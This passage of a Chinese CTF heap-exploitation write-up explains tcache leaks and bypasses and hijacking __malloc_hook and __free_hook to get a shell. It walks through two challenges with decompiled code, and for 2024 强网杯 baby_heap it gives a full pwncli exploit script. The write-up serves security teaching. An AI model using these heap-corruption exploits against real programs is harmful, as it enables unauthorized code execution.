+<h2 id="tcache泄露堆地址"><a href="#tcache泄露堆地址" class="headerlink" title="tcache泄露堆地址"></a>tcache泄露堆地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>)<br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<h2 id="绕过tcache"><a href="#绕过tcache" class="headerlink" title="绕过tcache"></a>绕过tcache</h2><p>glibc 2.26以后的 bins 存在 tcache bins</p>
+<p>让释放的<code>chunk</code>不进入tcache的方法</p>
+<p>需要绕过tcache一般是因为，<code>calloc</code>并不从tcache中取<code>chunk</code>，而是从fastbin中取<code>chunk</code>。</p>
+<p>另一个是因为高版本的glibc中对于tcache的double free检查严格，所以我们需要进行绕过。</p>
+<ul>
+<li>释放不在 tcache 大小范围的<code>chunk</code>。</li>
+</ul>
+<p>tcache中最大<code>chunk</code>大小为0x410</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x410</span>)<br>add_chunk(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>delete_chunk(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>释放相同大小的 chunk 将 tcache 填满</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#申请7个相同大小的chunk用来填满tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>	add(i,<span class="hljs-number">0x68</span>)<br>    <br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x68</span>)<br><br><span class="hljs-comment">#释放7个chunk填满tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(i)<br><br>dele(<span class="hljs-number">7</span>)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>如果题目限制了 free 次数那么需要通过 tcache dup 再 malloc 3 次将 counts 对应位置置为 -1 来绕过 tcache 。</li>
+</ul>
+<p>因为counts为-1，转为无符号数则大于等于7所以释放的chunk不会再进入tcache。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x68</span>)<br><br>delete_chunk(<span class="hljs-number">0</span>)<br>delete_chunk(<span class="hljs-number">0</span>)<br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x68</span>)<br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x68</span>)<br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x68</span>)<br><span class="hljs-comment">#进入fastbin的chunk</span><br>delete_chunk(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>控制 tcache_perthread_struct 从而控制 counts 实现绕过 tcache。</li>
+</ul>
+<h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><h3 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h3><p>如果 hook 有内容，那么执行hook的内容。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure>
+
+<p>gdb 调试查看一下，查看<code>__malloc_hook</code>地址。</p>
+<p><img src="/../../musl/assets/Pasted%20image%2020250411165402.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后通过<code>tel</code>查看地址上是否有内容，可以看到地址内容为空。</p>
+<p><img src="/../../musl/assets/Pasted%20image%2020250411165442.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果这个地址内容是一个函数比如<code>system</code>，那么调用<code>malloc</code>函数就会执行<code>system</code>函数。</p>
+<h3 id="free-hook"><a href="#free-hook" class="headerlink" title="free_hook"></a>free_hook</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br>  <span class="hljs-comment">// 调用 __free_hook ，参数是是否的内存的地址。</span><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>gdb调试</p>
+<p><img src="/../../musl/assets/Pasted%20image%2020250411165641.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看 free_hook 地址上的内容</p>
+<p><img src="/../../musl/assets/Pasted%20image%2020250411165755.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们可以通过在hook中写<code>system</code>函数，将<code>malloc</code>和<code>free</code>函数修改为执行<code>system</code>函数，我们<code>malloc</code>或<code>free</code>一个存有<code>/bin/sh</code>的chunk既可以完成getshell。或者我们可以将hook修改为one_gadget直接getshell。</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="2024-强网杯-baby-heap"><a href="#2024-强网杯-baby-heap" class="headerlink" title="2024 强网杯 baby_heap"></a>2024 强网杯 baby_heap</h3><blockquote>
+<p>2024 强网杯 baby_heap</p>
+</blockquote>
+<p>2.35 的堆，这题只需要懂得基本的地址泄露就可以完成。</p>
+<ul>
+<li>分析</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">❯ baby_heap checksec ./pwn<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></table></figure>
+
+
+
+<p>在程序中的<code>sub_1c99</code>函数中发现了任意地址写漏洞，即将<code>buf</code>变量的内容作为目标写入地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_1C99</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">if</span> ( dword_5068 )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  sub_1616(<span class="hljs-string">&quot;Wow ! You find my secret shop !\n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot;But ! It&#x27;s not so easy to get my secret \n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot;  /\\_/\\  \n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot; ( o.o ) \n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot;  &gt; ^ &lt;  \n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot;Input your target addr \n&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8uLL</span>);<br>  sub_1C33();<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x10u</span>LL);<br>  <span class="hljs-keyword">return</span> ++dword_5068;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里对范围进行了限制</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">sub_1C33</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">void</span> *result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">stdin</span> &lt;= buf &amp;&amp; &amp;<span class="hljs-built_in">stdin</span>[<span class="hljs-number">512</span>] &gt; buf )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  result = buf;<br>  <span class="hljs-keyword">if</span> ( &amp;<span class="hljs-built_in">stdin</span>[<span class="hljs-number">-2206368</span>] &gt; buf )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>这里通过<code>getenv</code>函数获取了环境变量，即 flag 藏在环境变量中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_1D5D</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> *v0; <span class="hljs-comment">// rax</span><br><br>  v0 = getenv(<span class="hljs-string">&quot;USER&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v0 )<br>    LODWORD(v0) = <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;USER = %s\n&quot;</span>, v0);<br>  <span class="hljs-keyword">return</span> v0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里存在一个 UAF 漏洞。我们可以通过 UAF 泄露<code>libc</code>基址，然后将任意地址修改为<code>puts</code>函数输出<code>environ</code>从而输出环境变量中的 flag。</p>
+<ul>
+<li>exp</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.35.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;e &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;: \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>    ru(<span class="hljs-string">&#x27;here \n&#x27;</span>)<br><br>malloc(<span class="hljs-number">0x700</span>)<br>malloc(<span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>base=u64(r(<span class="hljs-number">8</span>))-<span class="hljs-number">0x21ace0</span><br>got=base+<span class="hljs-number">0x00000000021A118</span><br>sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>s(p64(got))<br>s(p64(base+libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br><br>ia()<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="NISACTF-2022-UAF"><a href="#NISACTF-2022-UAF" class="headerlink" title="[[NISACTF 2022]UAF]"></a>[[NISACTF 2022]UAF]</h3><blockquote>
+<p>[[NISACTF 2022]UAF]</p>
+</blockquote>
+<p>题型：存在函数指针</p>
+<ol>
+<li>查保护</li>
+</ol>
+<p>发现为32位程序，并且没有<code>PIE</code>保护。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  [NISACTF 2022]UAF checksec ./pwn<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>分析</li>
+</ol>
+<p>分析<code>main</code>函数</p>
+<p>分析主函数发现为经典菜单程序，通过选择执行相应的功能函数。</p>
+<p>接下来我们逐个功能函数分析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> input[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  input[<span class="hljs-number">1</span>] = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.create&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.edit&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.delete&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4.show&quot;</span>);<br>      <span class="hljs-built_in">putchar</span>(<span class="hljs-number">58</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, input);<br>      <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      edit();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] == <span class="hljs-number">3</span> )<br>      &#123;<br>        del();<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] == <span class="hljs-number">4</span> )<br>      &#123;<br>        show();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>LABEL_13:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choice&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] != <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      create();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>首先我们来分析<code>create</code>函数，当输入的数字为1时执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you are creating the %d page\n&quot;</span>, i);<br>  result = i;<br>  <span class="hljs-keyword">if</span> ( i &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &lt;= <span class="hljs-number">9</span> )<br>    &#123;<br>      v1 = i;<br>      (&amp;page)[v1] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>);                 <span class="hljs-comment">// 固定申请8字节</span><br>      <span class="hljs-keyword">if</span> ( i )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( i &lt;= <span class="hljs-number">0</span> || i &gt; <span class="hljs-number">9</span> )<br>        &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Good cretation!&quot;</span>);<br>          <span class="hljs-keyword">return</span> ++i;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v2 = page;<br>        *page = <span class="hljs-number">0x6F616967</span>;<br>        v2[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>        *(page + <span class="hljs-number">1</span>) = echo;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The init page&quot;</span>);<br>        <span class="hljs-keyword">return</span> ++i;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>接下来分析<code>del</code>函数</p>
+<p>通过输入的数字来释放对应的<code>chunk</code>，并且数字不能够小于0或大于i。</p>
+<p>我们将<code>chunk</code>释放后，由于没有将指针置为<code>null</code>，所以这里存在一个UAF的漏洞。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">del</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt; i )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">free</span>((&amp;page)[v1]);                          <span class="hljs-comment">// free后没有将指针置为null，存在uaf漏洞</span><br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>接下来分析<code>edit</code>函数</p>
+<p>函数通过输入相应<code>chunk</code>的标号来释放<code>chunk</code>，但是前面有一个检查，如果输入的标号等于零或大于<code>i</code>则不会执行修改程序。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> || v1 &gt; i )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your strings&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, (&amp;page)[v1]);          <span class="hljs-comment">// 编辑page的内容，存在漏洞</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最后我们分析<code>show</code>函数</p>
+<p>程序通过标号查看相应<code>chunk</code>的内容，但是这里有一个非常关键的点。</p>
+<p>如果我们输入的标号为0，则并不会执行查看<code>chunk</code>的功能。</p>
+<p>但是会将<code>chunk</code>的内容作为函数指针执行。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> || v1 &gt; i )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      echo((&amp;page)[v1]);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    (*(page + <span class="hljs-number">1</span>))(page);                        <span class="hljs-comment">// 将page作为函数指针调用</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>综合以上分析</p>
+<ul>
+<li><code>create</code>函数固定申请8字节<code>chunk</code></li>
+<li><code>del</code>函数存在UAF漏洞</li>
+<li><code>edit</code>函数不能修改0<code>chunk</code>的内容</li>
+<li><code>show</code>函数可以将0<code>chunk</code>的内容作为函数指针执行</li>
+</ul>
+<p>我们可以通过利用UAF漏洞通过1<code>chunk</code>来间接修改0<code>chunk</code>的内容，比如将<code>chunk</code>内容修改为<code>system</code>函数或<code>one_gadget</code></p>
+<p>然后通过<code>show</code>函数调用执行。</p>
+<ol start="2">
+<li>exp</li>
+</ol>
